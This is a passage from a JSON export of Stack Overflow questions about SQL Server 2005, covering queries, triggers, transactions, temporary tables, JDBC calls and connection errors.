itself.</p>\n"},{"tags":["asp.net","sql","sql-server","database","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":12005335,"title":"asp.net dynamically loaded","body":"<p>I am having some problem in my data base connection when I am trying to dynamically load my page using data grid view in asp.net i am getting some error like:-</p>\n\n<blockquote>\n  <p>An error has occurred while establishing a connection to the server.\n  When connecting to SQL Server 2005, this failure may be caused by the\n  fact that under the default settings SQL Server does not allow remote\n  connections.  provider: Named Pipes Provider, error: 40 - Could not\n  open a connection to SQL Server</p>\n</blockquote>\n"},{"tags":["sql","sql-server-2005","delete"],"answer_count":4,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":6327,"score":0,"question_id":1665868,"title":"How to detect and remove a column that contains only null values?","body":"<p>In my table <strong>table1</strong> there are 6 columns Locations,a,b,c,d,e.</p>\n\n<p>Locations [a]   [b]   [c]  [d]   [e]</p>\n\n<p>[1]       10.00 Null  Null 20.00 Null</p>\n\n<p>[2]       Null  30.00 Null Null  Null</p>\n\n<p>i need the result like</p>\n\n<p>Locations [a]   [b]   [d]</p>\n\n<p>[1]       10.00 Null  20.00</p>\n\n<p>[2]       Null  30.00 Null</p>\n\n<p>My question is how to detect and delete column that contains all null values using sql query.\nIs it possible?</p>\n\n<p>If yes then please help and give sample.</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["sql-server","sql-server-2005","last-modified"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":1643,"score":2,"question_id":3969748,"title":"Last modification date for a live SQL Server 2005 database","body":"<p>Is there a way to know when the last write operation has occurred in a live SQL Server 2005 database?</p>\n\n<p>I currently have 30 (and growing) databases on my server. Only some of these see daily activity (but which ones get daily activity varies over time.) My backup space is limited and I'd like to do a daily backup of all \"modified since last backup\" databases.</p>\n\n<p>In fact, I'm asking the reverse of <a href=\"http://stackoverflow.com/questions/486685/find-out-the-last-write-date-in-a-sql-server-database\">this</a> question. Instead of asking last write date from a backup to see if I should restore it, I want to tell last write date of a live database to see if I should back it up.</p>\n\n<p>Since the backups run on the server itself, I could check the last modification time of the log, but that isn't very clean, nor I'm sure is totally reliable.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","null"],"answer_count":7,"favorite_count":2,"up_vote_count":7,"down_vote_count":0,"view_count":2465,"score":7,"question_id":377798,"title":"Field value must be unique unless it is NULL","body":"<p>I'm using SQL Server 2005.</p>\n\n<p>I have a field that must either contain a unique value or a NULL value. I think I should be enforcing this with either a <code>CHECK CONSTRAINT</code> or a <code>TRIGGER for INSERT, UPDATE</code>.</p>\n\n<p>Is there an advantage to using a constraint here over a trigger (or vice-versa)? What might such a constraint/trigger look like?</p>\n\n<p>Or is there another, more appropriate option that I haven't considered? </p>\n"},{"tags":["java","sql-server-2005","jdbc","transactions","commit"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":79,"score":0,"question_id":11987378,"title":"Java transaction - commit on conn doesn't","body":"<p>Suppose I have the following Java code fragment (where something like it is embedded in a legacy app)</p>\n\n<pre><code>...\ntry {\n    con.setAutoCommit(false);\n    updateSales = con.prepareStatement(updateString);\n    updateTotal = con.prepareStatement(updateStatement);\n\n    updateSales.setInt(1, e.getValue().intValue());\n    updateSales.setString(2, e.getKey());\n    updateSales.executeUpdate();\n    updateTotal.setInt(1, e.getValue().intValue());\n    updateTotal.setString(2, e.getKey());\n    updateTotal.executeUpdate();\n    con.commit();\n} catch (SQLException e ) {\n...\n</code></pre>\n\n<p>Assuming this is connecting to an SQL Server 2005 database (with the ms 2005 driver) - is there any reason that the con.commit would NOT commit the transaction?</p>\n"},{"tags":["java","sql-server-2005","jdbc"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":198,"score":2,"question_id":7839233,"title":"Jdbc Ms SQL Driver 3.0 callable statement using default parameters","body":"<p>What is the best way to reuse a <code>CallableStatement</code>\nI want to use the same <code>msp_updateOption</code> in different ways and make it reusable code.\nAlso the <code>CallableStatement</code> should take input as parameter type and not indexes.</p>\n\n<pre><code>private static final String UPDATE_INFO = \"{call msp_updateOption (?,?,?,?,?,?,?,?,?,?)}\";\nprivate static final String UPDATE__INFO_NO_COMMENT = \"{call msp_updaterOption (?,?,?,?,?,?,?,?,?)}\";\nprivate static final String UPDATE_INFO_NO_COMMENT_NO_G = \"{call msp_updateOption (?,?,?,?,?,?,?,?)}\";\n\nALTER procedure [dbo].[msp_UpdateOption]\n@pnbr int,\n@pB datetime=null,\n@stopFlag int,\n@emailFlag int,\n@name varchar(100),\n@pName varchar(100),\n@pID varchar(100),\n@gNbr int=null,\n@commentTypeID int=null,\n@updateTypeID int\n</code></pre>\n\n<p>I tried implementing something like this: where map = <code>HashMap</code> having <code>name-value</code> pairs. <code>name</code> is <code>param name</code>.</p>\n\n<pre><code>Set set = map.keySet();\nIterator itr = set.iterator(); // iterate through HashMap values\n// iterator\ntry {\n    while (itr.hasNext()) {\n        String paramType = (String) (itr.next());\n        cstmt.setObject(paramType,map.get(paramType));\n        cstmt.execute();\n    } \n</code></pre>\n\n<p>while executing this , it always goees beyond the index defined for the sp and errors out.\nWill this implementation work. It worked with the older version JDBC driver of MS SQL \nThis is the error I get. </p>\n\n<pre><code> com.microsoft.sqlserver.jdbc.SQLServerException: The index 10 is out of range.\n[10/20/11 18:56:25:082 CDT] 0000002d SystemOut     O    at com.microsoft.sqlserver.jdbc.SQLServerException.makeFromDriverError(SQLServerException.java:171)\n[10/20/11 18:56:25:082 CDT] 0000002d SystemOut     O    at com.microsoft.sqlserver.jdbc.SQLServerPreparedStatement.setterGetParam(SQLServerPreparedStatement.java:700)\n[10/20/11 18:56:25:082 CDT] 0000002d SystemOut     O    at com.microsoft.sqlserver.jdbc.SQLServerPreparedStatement.setObjectNoType(SQLServerPreparedStatement.java:896)\n[10/20/11 18:56:25:082 CDT] 0000002d SystemOut     O    at com.microsoft.sqlserver.jdbc.SQLServerCallableStatement.setObject(SQLServerCallableStatement.java:1379)\n[10/20/11 18:56:25:082 CDT] 0000002d SystemOut     O    at com.ibm.ws.rsadapter.jdbc.WSJdbcCallableStatement.setObject(WSJdbcCallableStatem\n</code></pre>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":202,"score":2,"question_id":12001783,"title":"TSQL Select Min & Max row when grouping","body":"<p>Lets say I have a table containing many many rows like this:</p>\n\n<pre><code>ID        Range         Range_begining        Profit\n----------------------------------------------------\n 1    (100-150)                    100           -20\n 2    (200-250)                    200          40.2\n 3    (100-150)                    100           100\n 4    (450-500)                    450           -90\n ...\n</code></pre>\n\n<p>I'm doing a simple query like this:</p>\n\n<pre><code>SELECT max([Range]) AS 'Range'\n     , count(ID) AS 'Count'\n     , round(avg([Profit]), 2) AS 'AVG Profit'\n    FROM\n        Orders\n    GROUP BY\n        Range_begining\n</code></pre>\n\n<p>After this query is run I get results like this:</p>\n\n<pre><code>Range        Count        AVG Profit\n------------------------------------\n(100-150)        2                40\n(200-250)        1              40.2\n(450-500)        1               -90\n ...\n</code></pre>\n\n<p>Quite simple :)</p>\n\n<p>What I need to do now is to select row with minimum and maximum profit where count is bigger than 10 (this is a parameter)</p>\n\n<p>I was able to get minimum value with this:</p>\n\n<pre><code>SELECT TOP 1 [Range], [AVG Profit] FROM (\n     SELECT max([Range]) AS 'Range'\n         , count(ID) AS 'Count'\n         , round(avg([Profit]), 2) AS 'AVG Profit'\n        FROM\n            Orders\n        GROUP BY\n            Range_begining) X\nWHERE\n    [Count]&gt;10\nORDER BY \n    [AVG Profit] ASC --or DESC if I want max profit\n</code></pre>\n\n<p>I was thinking of doing an <code>UNION</code> for above query with ORDER BY DESC, but it isn't the best solution.</p>\n\n<p>What I need to do:<br />\n<strong>Select 2 rows: one with minimum, second with maximum AVG Profit when grouping by Range.</strong></p>\n\n<p><strong>EDIT:</strong>\nIf I add 2 move columns to my main data table like this:</p>\n\n<pre><code>ID        Range         Range_begining        Profit        OrderDate     Company\n---------------------------------------------------------------------------------\n 1    (100-150)                    100           -20        2012-01-02          1\n 2    (200-250)                    200          40.2        2012-03-22          0\n 3    (100-150)                    100           100        2012-02-05          0\n 4    (450-500)                    450           -90        2012-05-12          1\n ...\n</code></pre>\n\n<p>And then try to add 2 more conditions like this:</p>\n\n<pre><code>; with ordering as (\n  SELECT max([Range]) AS 'Range'\n     , count(ID) AS 'Count'\n     , round(avg([Profit]), 2) AS 'AVG Profit'\n     , row_number() over (order by avg([Profit])) rn_min\n     , row_number() over (order by avg([Profit]) desc) rn_max\n    FROM\n        Orders\n    GROUP BY\n        Range_begining\n    HAVING COUNT(ID) &gt; 10\n    AND [Company]=@company\n    AND (@from= '' OR [OrderDate]&gt;=@from)\n    AND (@to= '' OR [OrderDate]&lt;=@to)\n)\nselect [range], [count], [avg profit]\n  from ordering\n where (rn_max = 1 or rn_min = 1)\n</code></pre>\n\n<p>I get an error because [Company] and [OrderDate] </p>\n\n<blockquote>\n  <p>is invalid in the HAVING clause because it is not contained in either\n  an aggregate function or the GROUP BY clause.</p>\n</blockquote>\n\n<p>How can I fix this?</p>\n\n<p><strong>EDIT2</strong>\nGot it working!</p>\n\n<pre><code>; with ordering as (\n  SELECT max([Range]) AS 'Range'\n     , count(ID) AS 'Count'\n     , round(avg([Profit]), 2) AS 'AVG Profit'\n     , row_number() over (order by avg([Profit])) rn_min\n     , row_number() over (order by avg([Profit]) desc) rn_max\n    FROM\n        Orders\n    WHERE\n    [Company]=@company\n    AND (@from= '' OR [OrderDate]&gt;=@from)\n    AND (@to= '' OR [OrderDate]&lt;=@to)\n    GROUP BY\n        Range_begining\n    HAVING COUNT(ID) &gt; 10\n)\nselect [range], [count], [avg profit]\n  from ordering\n where (rn_max = 1 or rn_min = 1)\n</code></pre>\n\n<p><strong>EDIT 3</strong>\nCan I return another column with description like this:</p>\n\n<pre><code>Range        AVG Profit               Description\n-------------------------------------------------\n(200-250)          40.2           Max profit here\n(450-500)           -90     Min profit, well done\n</code></pre>\n\n<p><strong>EDIT 4</strong>\nFast answer (based on @Nikola Markovinović answer):</p>\n\n<pre><code>; with ordering as (\n  SELECT max([Range]) AS 'Range'\n     , count(ID) AS 'Count'\n     , round(avg([Profit]), 2) AS 'AVG Profit'\n     , row_number() over (order by avg([Profit])) rn_min\n     , row_number() over (order by avg([Profit]) desc) rn_max\n    FROM\n        Orders\n    WHERE\n    [Company]=@company\n    AND (@from= '' OR [OrderDate]&gt;=@from)\n    AND (@to= '' OR [OrderDate]&lt;=@to)\n    GROUP BY\n        Range_begining\n    HAVING COUNT(ID) &gt; 10\n)\n    SELECT\n    CASE WHEN rn_max=1 THEN 'This is max' ELSE 'Min' END AS 'Description'\n    ,[range]\n    ,[count]\n    ,[avg profit]\n    FROM ordering\n    WHERE (rn_max = 1 or rn_min = 1)\n</code></pre>\n"},{"tags":["sql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":69,"score":1,"question_id":12002376,"title":"Order by condition for two DATETIME columns ","body":"<p>I read <a href=\"http://stackoverflow.com/questions/2367457/order-by-condition\">ORDER BY condition</a> and <a href=\"http://stackoverflow.com/questions/4213270/how-to-add-condition-in-order-by\">How to add condition in &#39;order by&#39;?</a> but these don't answer to my issue.</p>\n\n<p>I have 2 datetime columns called <code>CREATION_DATE</code> and <code>UPDATE_DATE</code>.</p>\n\n<p>I want to sort (using <code>ORDER BY</code> clause) by :</p>\n\n<ul>\n<li><p><code>CREATION_DATE</code> if <code>CREATION_DATE = UPDATE_DATE</code></p>\n\n<p>or</p></li>\n<li><p><code>UPDATE_DATE</code> in other case.</p></li>\n</ul>\n\n<p>I wrote </p>\n\n<pre><code>SELECT * FROM Table1\nORDER BY\nCASE Table1.CREATION_DATE\n    WHEN Table1.CREATION_DATE = Table1.UPDATE_DATE THEN Table1.CREATION_DATE\n    ELSE Table1.UPDATE_DATE\nEND ASC\n</code></pre>\n\n<p>but it does not work, I get an error at the <code>=</code> symbol. </p>\n\n<p>I tried with other operators... Of course, I make mistake but I don't know if is correct to use operators in <code>WHEN</code> statement.</p>\n\n<p>Is not accepted operators in <code>WHEN</code> ?</p>\n\n<p>Thank you</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12000999,"title":"How to list the source table name of columns in a VIEW (SQL Server 2005)","body":"<p>Just wondering how to list column name and table name in one query for a view</p>\n\n<p>for example</p>\n\n<p>a view named as viewC, create by tbl1 inner join tbl2, contain a,b,c,d, 4columns.</p>\n\n<p>a,b from tbl1, c,d from tbl2</p>\n\n<p>How to Select COLUMN_NAME, DATA_TYPE, column_default, character_maximum_length, <strong>sourceTableNAME</strong> FROM information_schema.columns where table_name='viewC' together?</p>\n\n<p>Thanks </p>\n"},{"tags":["sql","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":93,"score":0,"question_id":12001006,"title":"What Is Difference Between {Server Name} localhost vs .\\SqlExpress","body":"<p>can you please tell me\nWhat Is Difference Between {Server Name} (local),localhost,(pc-name)\\SQLEXPRESS,.\\SqlExpress ...</p>\n"},{"tags":["sql-server","sql-server-2005","syntax-error"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":106,"score":-1,"question_id":12000646,"title":"SQL Server 2005 : Incorrect syntax near '='","body":"<p>Did any body face above error in SQL Server 2005 when using <code>+=</code> string concatenation operator. </p>\n\n<p>According to SQL Server 2005 books online, it should work, even the example shown in MSDN does not compile in SQL Server Management Studio 2005.</p>\n\n<p>In SQL server 2008 it works fine.  </p>\n\n<p>I think its bug in SQL Server 2005.</p>\n\n<p>The workaround is achieve the concatenation using <code>+</code> operator.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","full-text-search","containstable"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":88,"score":3,"question_id":11994281,"title":"Near matches not found in CONTAINSTABLE","body":"<p>I am using <strong><kbd>SQL Server 2008</kbd></strong></p>\n\n<h2>DDL</h2>\n\n<pre><code>CREATE TABLE [dbo].[t](\n    [words] [varchar](1000) NULL,\n    [id] [int] IDENTITY(1,1) NOT NULL\n) ON [PRIMARY]\n</code></pre>\n\n<h2>DML</h2>\n\n<pre><code>insert into t(words)values('this is my laptop')\ninsert into t(words)values('this does not contains headphone')\n</code></pre>\n\n<h2>SQL Query</h2>\n\n<pre><code>SELECT *\nFROM \nt as t\nJOIN CONTAINSTABLE(t, words,'\"headphone*\"', 10) fulltextSearch\nON\nt.Id = fulltextSearch.[KEY]\n</code></pre>\n\n<h2>Results</h2>\n\n<p>No record found</p>\n\n<p>I am expecting one records. Any Idea?</p>\n"},{"tags":["sql","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":11978193,"title":"Nested Select or Inner Join including rows from another table","body":"<p>I have a pretty complex select statement that returns counted statistics from tables (think of it as an answer bank -- the complex select statement below) using inner join. </p>\n\n<p>These answers are related to a table called Questions_Bank_AnswerChoices (which stores all the questions).  </p>\n\n<p>I am attempting to first pull the Questions (from the table Questions_Bank_AnswerChoices) then match them up with the statistics (complex statement below).   The complex statement below pulls the statistics, but does not pull the questions unless they have been answered.  </p>\n\n<p>So, if no one answers question1, then question one will not show up in the statistics because it is not included in the Answers table (bc no one answered it).  </p>\n\n<p>How can I achieve this?  I think that I need to outer join?</p>\n\n<p>Complex Select Statement:</p>\n\n<pre><code>WITH tbl as (\n   SELECT \n      Questions_Bank.QuestionID, Questions_Bank.QuestionName,   \n      REPLACE(Schools_Answers_Items.AnswerValue, '? ', ', ') as AnswerValue, \n      COUNT(Schools_Answers_Items.SchoolsAnswersItemID) AS CountAnswer,\n      Schools_Answers_Items.SchoolID \n   FROM Questions_Bank \n   INNER JOIN Schools_Answers_Items\n     ON Questions_Bank.QuestionID = Schools_Answers_Items.QuestionID \n   LEFT OUTER JOIN Schools_Answers  \n     ON Schools_Answers_Items.SchoolsAnswerID = Schools_Answers.SchoolsAnswerID \n   WHERE (Questions_Bank.QuestionID = 1108) \n     AND (Schools_Answers.SchoolID = 103) \n   GROUP BY \n      Schools_Answers_Items.SchoolID,         \n      Schools_Answers_Items.AnswerValue,\n      Questions_Bank.QuestionID, \n      Questions_Bank.QuestionName\n) \nSELECT \n   QuestionID, QuestionName, AnswerValue, CountAnswer, \n   SUM(CountAnswer) OVER () AS CountAllAnswers  \nFROM tbl\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","triggers"],"answer_count":10,"favorite_count":10,"up_vote_count":27,"down_vote_count":0,"view_count":131580,"score":27,"question_id":405288,"title":"SQL Server \"AFTER INSERT\" trigger doesn't see the just-inserted row","body":"<p>Consider this trigger:</p>\n\n<pre><code>ALTER TRIGGER myTrigger \n   ON someTable \n   AFTER INSERT\nAS BEGIN\n  DELETE FROM someTable\n         WHERE ISNUMERIC(someField) = 1\nEND\n</code></pre>\n\n<p>I've got a table, someTable, and I'm trying to prevent people from inserting bad records. For the purpose of this question, a bad record has a field \"someField\" that is all numeric.</p>\n\n<p>Of course, the right way to do this is NOT with a trigger, but I don't control the source code... just the SQL database. So I can't really prevent the insertion of the bad row, but I can delete it right away, which is good enough for my needs.</p>\n\n<p>The trigger works, with one problem... when it fires, it never seems to delete the just-inserted bad record... it deletes any OLD bad records, but it doesn't delete the just-inserted bad record. So there's often one bad record floating around that isn't deleted until somebody else comes along and does another INSERT.</p>\n\n<p>Is this a problem in my understanding of triggers? Are newly-inserted rows not yet committed while the trigger is running?</p>\n"},{"tags":["sql","sql-server-2005","oltp"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":11992624,"title":"Concurrent Reads from Highly Transactional Table","body":"<p>Currently, I have a highly transactional database with appx 100,000 inserts daily.  Do I need to be concerned if I start allowing a large number of concurrent reads from my main transaction table?  I am not concerned about concurrency, so much as performance.</p>\n\n<p>At present there are 110+ million transactions in this table, and I am using SQL 2005</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","trace"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":11991187,"title":"Who was the last to modify a database object?","body":"<p><a href=\"http://izlooite.blogspot.com/2010/12/sql-server-how-to-find-user-who-last.html\" rel=\"nofollow\">This</a> article describes how to run a standard report to display recent DDL changes. </p>\n\n<p>If the data is captured, it's probably in a table somewhere. I would like to <code>Trace</code> this location so I can construct my own reports.</p>\n\n<p>Is this possible?</p>\n"},{"tags":["c#","sql-server-2005","datagrid"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":192,"score":0,"question_id":4690723,"title":"assign value to datagridview cell at run time in c#","body":"<p>I have datagrid view in which I have 3 columns.  The are name, price, and quantity.  I have populated the first 2 columns from a dataset and now I want to assign a value to quantity the column based on the data in the existing columns.  How can I do that?</p>\n"},{"tags":["sql","sql-server-2005","implicit-conversion","query-plans"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":52,"score":5,"question_id":11989854,"title":"Analyising Implict CAST","body":"<p>I have an academic scenario, which I would like to know how to analyse.</p>\n\n<pre><code>DECLARE @date DATETIME\nSET     @date = getDate()\nSET     @date = DATEADD(DAY, DATEDIFF(DAY, 0, @date-3), 3)\n</code></pre>\n\n<p>This will round the date down to a Thursday.</p>\n\n<p>What I have been challenged on is to evidence where there are <em>implicit</em> CASTs.</p>\n\n<p>The are three places where I presume that this must be occuring...</p>\n\n<pre><code>DATEADD(\n  DAY,\n  DATEDIFF(\n    DAY,\n    0,          -- Implicitly CAST to a DATETIME?\n    @date-3     -- I presume the `3` is being implicitly cast to a DATETIME?\n  ),\n  3             -- Another implicit CAST to a DATETIME?\n)\n</code></pre>\n\n<p>Perhaps, however, as the <code>0</code> and <code>3</code>'s are are constants, this is done during compilation to an execution plan?</p>\n\n<p>But if the <code>3</code>'s were INT variables, would that be different?</p>\n\n<p><br/></p>\n\n<p>Is there a way to analyse an execution plan, or some other method, to be able to determine this imperically?</p>\n\n<p>To make matters more complicated, I'm currently off site.  I'm trying to remotely assist a colleague with this.  Which means I do not have direct access to SSMS, etc.</p>\n"},{"tags":["sql","database","sql-server-2005","connection","godaddy"],"answer_count":9,"favorite_count":2,"up_vote_count":7,"down_vote_count":0,"view_count":8346,"score":7,"question_id":357147,"title":"Go Daddy SQL Server 2005 Remote Connection","body":"<p>Is it possible to connect to my remote database hosted at godaddy from locally from my PC?</p>\n\n<p>And if yes how?</p>\n\n<p>I tried the connection string provided to me but it didn't work.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":8535942,"title":"Calculating minutes within a defined time window?","body":"<p>I am looking to calculate the minutes spent performing a task that is within a specific time window. </p>\n\n<p>I have the two input parameters defining the time window <code>@WindowStart</code> and  <code>@WindowEnd</code> and i have [Task Start] and [Task End] columns in my task table. </p>\n\n<p>What would be the easiest way to calculate the time spent on a task that is within my time window? Tasks can easily begin or end after <code>@WindowStart</code> and <code>@WindowEnd</code>.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1200,"score":1,"question_id":3278860,"title":"Optional parameter in SQL server","body":"<p>I have a user defined function which is used in many stored procedures which will return me some value. If it possible for me to add a new optional parameter to the same.</p>\n\n<p>If I don't pass any value it should be null and if I pass some value it should take it. I don't want to go and change all the stored procedures to do so.</p>\n\n<p>Example code</p>\n\n<pre><code>dbo.CalculateAverageForUser(userid int)\n</code></pre>\n\n<p>Can I use <code>dbo.CalculateAverageForUser(userid int, type NVARCHAR(10) = NULL)</code></p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":167,"score":1,"question_id":11986552,"title":"How to check correctly if a temporary table exists in SQL Server 2005?","body":"<p>I have a query where I insert some values from a table:</p>\n\n<pre><code>SELECT ID, NAME INTO #tmpTable1\nFROM TableOriginal\n</code></pre>\n\n<p>First execution is fine, if I press F5(Run) in MSSMS (Microsoft Sql Server Management Studio), the error occured:</p>\n\n<blockquote>\n  <p><em>Msg 2714, Level 16, State 6, Line 4<br>\n  There is already an object named '#tmpTable1' in the database.</em></p>\n</blockquote>\n\n<p>Good. I decided to check before insert data from <code>TableOriginal</code> to <code>#tmpTable1</code> using:</p>\n\n<pre><code>IF OBJECT_ID('tempdb.#tmpTable1') IS NOT NULL  \n  DROP TABLE #tmpTable1\n</code></pre>\n\n<p>Not working, the error shows again as above.</p>\n\n<p>I saw in <code>tempdb</code> database the following temporary table name:</p>\n\n<pre><code>dbo.#tmpTable1__________________0000007\n</code></pre>\n\n<p>Why? Every time when create a temporary table (using first query), the table name will be generated automatically in MSSMS ?</p>\n\n<p>How to remove the existing temporary table to do a new table with new values ?</p>\n"},{"tags":["sql","sql-server-2008","sql-server-2005","indexing","firebird2.5"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":134,"score":1,"question_id":11984636,"title":"How to decide when use index on table column","body":"<p>When should I use index on table?</p>\n\n<ol>\n<li>From how many rows index makes sense?</li>\n<li>If I have table with constant rows, just edited come columns (not in 'where' clause), makes index sense even if table has just about 15 rows? EDIT: Can be in such case non-index selecting/reading more effective than index read?</li>\n</ol>\n\n<p>EDIT:\nNow I am working with firebird 2.5, but most of the time I am using SQL Server 2005/2008. </p>\n"},{"tags":["sql-server-2005","linq-to-sql","stored-procedures","transactions"],"answer_count":2,"favorite_count":17,"up_vote_count":20,"down_vote_count":0,"view_count":7997,"score":20,"question_id":2073737,"title":"Nested stored procedures containing TRY CATCH ROLLBACK pattern?","body":"<p>I'm interested in the side effects and potential problems of the following pattern:</p>\n\n<pre><code>CREATE PROCEDURE [Name]\nAS\nBEGIN\n    BEGIN TRANSACTION\n    BEGIN TRY\n        [...Perform work, call nested procedures...]\n    END TRY\n    BEGIN CATCH\n        ROLLBACK TRANSACTION\n        RAISERROR [rethrow caught error using @ErrorNumber, @ErrorMessage, etc]\n    END CATCH\nEND\n</code></pre>\n\n<p>To the best of my understanding this pattern is sound when used with a single procedure - the procedure will either complete all of its statements without error, or it will rollback all actions and report the error.</p>\n\n<p>However when one stored procedure calls another stored procedure to do some sub-unit of work (with the understanding that the smaller procedure is sometimes called on its own) I see an issue coming about with relation to rollbacks - an informational message (Level 16) is issued stating <code>The ROLLBACK TRANSACTION request has no corresponding BEGIN TRANSACTION.</code>. This I assume is because the rollback in the sub-procedure is always rolling back the outer-most transaction, not just the transaction started in the sub-procedure.</p>\n\n<p>I do want the whole thing rolled back and aborted if any error occurs (and the error reported to the client as an SQL error), I'm just not sure of all the side effects that come from the outer layers trying to rollback a transaction that has already been rolled back. Perhaps a check of <code>@@TRANCOUNT</code> before doing a rollback at each TRY CATCH layer?</p>\n\n<p>Finally there is the client end (Linq2SQL), which has it's own transaction layer:</p>\n\n<pre><code>try\n{\n    var context = new MyDataContext();\n    using (var transaction = new TransactionScope())\n    {       \n            // Some Linq stuff\n        context.SubmitChanges();\n        context.MyStoredProcedure();\n        transactionComplete();\n    }\n}\ncatch\n{\n    // An error occured!\n}\n</code></pre>\n\n<p>In the event that a stored procedure, \"MySubProcedure\", called <em>inside</em> MyStoredProcedure raises an error, can I be sure that everything previously done in MyStoredProcedure will be rolled back, all the Linq operations made by SubmitChanges will be rolled back, and finally that the error will be logged? Or what do I need to change in my pattern to ensure the whole operation is atomic, while still allowing the child parts to be used individually (i.e. the sub-procedures should still have the same atomic protection)</p>\n"},{"tags":["sql","sql-server-2005","sql-server-2008","backup","restore"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":783,"score":2,"question_id":3102273,"title":"simple & fast sql server database backup and restore","body":"<p>I'm looking for a simple (simplest if possible) way of backing up and restoring a database.</p>\n\n<p>I want to do a backup in one state and then after doing some operations get back to the backed up state. </p>\n\n<p>Tried Database->Tasks->Back Up... and then Database->Tasks->Restore but I always get an error with:</p>\n\n<p><code>Restore failed for...DBName</code></p>\n\n<p><code>The tail of the log for the database \"database name\" has not been backed up...</code></p>\n\n<p>So, I want to back up and restore with one simple operation each, can one advise me \nto a solution, be it GUI or not GUI based?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","resize"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":11970830,"title":"resize SQL Varchar","body":"<p>Is there a way to resize a local varchar in sql?</p>\n\n<p>like:</p>\n\n<pre><code>DECLARE @MYVARIABLE AS VARCHAR(3)\nREDIM @MYVARIABLE(50)\n</code></pre>\n\n<p>That will change the size of @MYVARIABLE to 50 char.</p>\n\n<p>Note: I need to keep the variable because I use it after.\nSo I cant use another one.</p>\n\n<p>Sample 2:</p>\n\n<pre><code>DECLARE @MYVARIABLE AS VARCHAR(4)\nSET @MYVARIABLE = 'TEST'\nSET @MYVARIABLE = '12345'\nSELECT @MYVARIABLE\n</code></pre>\n\n<p>here, MYVARIABLE = '1234' at the end. should be '12345'\nhow to do it (and keep myvariable)</p>\n\n<p>can I delete the current and create a new one?</p>\n"},{"tags":["java","sql-server-2008","tsql","sql-server-2005","teradata"],"answer_count":5,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":139,"score":0,"question_id":11965633,"title":"Getting distinct values from Resultset","body":"<p>I have the following table Employee and records as follows:</p>\n\n<pre><code>Eid      Ename     Phone\n------------------------     \n 1         A        043\n 1         A        067\n 2         B        073\n 2         B        072\n 3         C        753 \n 3         C        464\n</code></pre>\n\n<p>What I've got so far:</p>\n\n<pre><code>SELECT *\nFROM   (SELECT Row_number() OVER (ORDER BY Eid ASC) AS rownum,\n               Eid,\n               Ename,\n               Phone\n        FROM   Employee\n        WHERE  Eid IN(SELECT DISTINCT(Eid)\n                      FROM   Employee\n                      GROUP  BY Eid)) AS RESULTSET\nWHERE  rownum BETWEEN 0 AND 3\n</code></pre>\n\n<p>Actually the inner query is returning the <code>distinct</code> results but it is not reflected when I am getting the result in final <code>RESULTSET</code>.</p>\n\n<p>Please advise on how to get the distinct RESULTSET. My output should return like below:</p>\n\n<pre><code>Eid      Ename     Phone\n------------------------     \n 1         A         043\n 2         B         073\n 3         C         753\n</code></pre>\n"},{"tags":["sql","sql-server-2005","pivot"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":241,"score":1,"question_id":2070183,"title":"How to convert data rows to columns?","body":"<p>I have a table tblUser , there is userId,firstName,LastName,Mobile,.......,QuestionID.\nAnother table it's name tblResults There is  questionID,Question,choiceID,choice,.........</p>\n\n<p>EG:</p>\n\n<pre><code>tblUser\n-----------------------------------------------------------------------------\nuserID -  FirstName- LstName -Mobile  ...     ...     ... -  QuestionID -  ChiceID\n-----------------------------------------------------------------------------\n001   -   xx     -     yy   -   03212          -                   01        01 \n001   -   xx     -     yy   -   03212          -                   02        02 \n002   -   xxx     -    yyy  -   03425         -                    01        02 \n002   -   xxx     -    yyy  -   03425        -                     02        01  \n003   -   xxxx    -    yyyy  -  03429         -                    03        02 \n003   -   xxxx   -     yyyy  -  03429          -                   03        01 \n------------------------------------------------------------------------------\n\ntblResults\n---------------------------------------------------------------------\nQuestionID   Question       ChoiceID       Chice    ....     ....            \n---------------------------------------------------------------------\n01        